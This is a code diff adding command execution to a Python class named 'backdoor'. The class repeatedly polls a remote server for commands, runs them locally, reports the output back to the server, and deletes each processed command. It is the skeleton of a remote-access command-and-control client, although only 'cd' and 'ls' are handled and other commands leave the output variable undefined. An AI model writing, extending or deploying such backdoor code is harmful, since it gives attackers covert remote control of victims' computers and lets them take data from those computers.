@@ -21,10 +21,17 @@ class backdoor:
         r = requests.get(self.url + f"computer/{self.computer_id}")
         return r.json()['commands']
 
-    def send_command(self, command):
-        r = requests.post(self.url + "computer/command/", json={"command": command, "target_id": self.computer_id})
+    def command_delete(self, command):
+        r = requests.delete(self.url + f"command/{command['id']}/delete")
         return r.json()
-  
+    
+    def command_run(self, command):
+        if command.startswith('cd'):
+            output = os.chdir(command[3:])
+        if command.startswith('ls'):
+            output = "".join(os.listdir())
+        print(output)
+        requests.put(self.url + f"computer/{self.computer_id}/output/", json={"output": output})
     def run(self):
         x = 0
         while True:
@@ -34,8 +41,11 @@ class backdoor:
             x += 1
             print(f"{round((end-start)*1000,1)}ms {x} request")
             for command in commands:
-                pass
-                #print(command)
-                #self.send_command(command)
+                print(command)
+                self.command_run(command['name'])
+                self.command_delete(command)
+            time.sleep(0.1)
+
+
             
 backdoor = backdoor()
